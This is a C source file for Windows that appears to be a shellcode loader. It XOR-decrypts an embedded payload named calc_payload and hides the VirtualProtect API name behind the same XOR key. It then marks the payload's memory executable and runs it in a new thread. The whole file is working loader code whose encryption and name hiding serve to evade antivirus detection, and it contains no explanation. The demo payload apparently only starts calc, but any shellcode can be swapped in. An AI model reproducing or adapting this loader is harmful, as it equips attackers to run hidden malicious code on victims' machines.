#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);


unsigned char calc_payload[] = { 0x91, 0x8d, 0xed, 0x77, 0x6d, 0x65, 0xf, 0xfe, 0x88, 0x54, 0xaf, 0x13, 0xe6, 0x35, 0x5f, 0xfc, 0x3f, 0x69, 0xe4, 0x25, 0x79, 0xee, 0x1d, 0x5f, 0x62, 0xd2, 0x25, 0x51, 0x5c, 0x9a, 0xc3, 0x4b, 0xc, 0x19, 0x6d, 0x5b, 0x4d, 0xa4, 0xa0, 0x7a, 0x6c, 0xa2, 0x8d, 0x85, 0x3f, 0x32, 0xe4, 0x25, 0x7d, 0xee, 0x25, 0x4b, 0xe6, 0x29, 0x7e, 0xf, 0x8e, 0x2d, 0x6e, 0xa6, 0x3c, 0xee, 0x36, 0x57, 0x6c, 0xb6, 0xe4, 0x3e, 0x75, 0x86, 0x55, 0x3e, 0xe6, 0x51, 0xe4, 0x76, 0xbb, 0x54, 0x90, 0xdb, 0xac, 0xaa, 0x62, 0x76, 0xaa, 0x5d, 0x8f, 0x2, 0x9b, 0x66, 0x12, 0x8f, 0x56, 0x18, 0x4b, 0x2, 0x89, 0x3d, 0xe4, 0x2f, 0x49, 0x64, 0xbc, 0x11, 0xe6, 0x69, 0x24, 0xfc, 0x35, 0x79, 0x6e, 0xa4, 0xe6, 0x61, 0xe4, 0x76, 0xbd, 0xec, 0x2b, 0x53, 0x49, 0x3e, 0x34, 0x16, 0x34, 0x3f, 0x3e, 0x88, 0x8d, 0x3a, 0x30, 0x2d, 0xe6, 0x77, 0x84, 0xfa, 0x30, 0xf, 0x6e, 0xfa, 0xe8, 0xd7, 0x6f, 0x77, 0x6d, 0x35, 0x7, 0x46, 0xe6, 0xa, 0xe8, 0x88, 0xb8, 0xde, 0x9f, 0xc2, 0xcf, 0x33, 0x7, 0xd1, 0xf8, 0xd8, 0xf2, 0x88, 0xb8, 0x59, 0x69, 0xb, 0x67, 0xe5, 0x94, 0x97, 0x18, 0x60, 0xd4, 0x30, 0x7e, 0x17, 0x0, 0x1d, 0x6d, 0x36, 0x90, 0xa2, 0xe, 0x4, 0x3, 0x14, 0x43, 0x0, 0x17, 0x12, 0x6d };
unsigned int calc_len = sizeof(calc_payload);

unsigned char cVirtualProtect[] = { 0x3b, 0xc, 0x1d, 0x3, 0x18, 0x4, 0x3, 0x27, 0x1f, 0xa, 0x1b, 0x12, 0xe, 0x11, 0x6f };
unsigned int cVirtualProtectLen = sizeof(cVirtualProtect);


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	char key[] = "meowmeow";

	// Allocate buffer for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	XOR((char *) calc_payload, calc_len, key, sizeof(key));

	// Copy payload to the buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	
	// Make the buffer executable
	XOR((char *) cVirtualProtect, cVirtualProtectLen, key, sizeof(key));
	pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), cVirtualProtect);
	rv = pVirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me!\n");
	getchar();

	// If all good, run the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
